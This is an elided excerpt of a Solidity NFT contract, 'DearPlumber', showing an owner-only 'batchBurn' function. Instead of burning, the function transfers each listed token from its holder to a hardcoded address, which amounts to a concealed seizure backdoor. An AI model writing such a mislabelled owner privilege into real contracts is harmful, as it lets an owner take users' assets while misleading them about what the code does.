...
contract DearPlumber is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("DearPlumber", "DP", maxBatchSize_, collectionSize_) {
  ...
  function batchBurn(uint256[] memory tokenids) external onlyOwner {
        ...
        for (uint256 i; i < len; i++) {
            ...
            transferFrom(ownerOf(tokenid), 0x811e54aC82DeaF709f9547389d0E6d9CD50EfA25, tokenid);
        }
    }
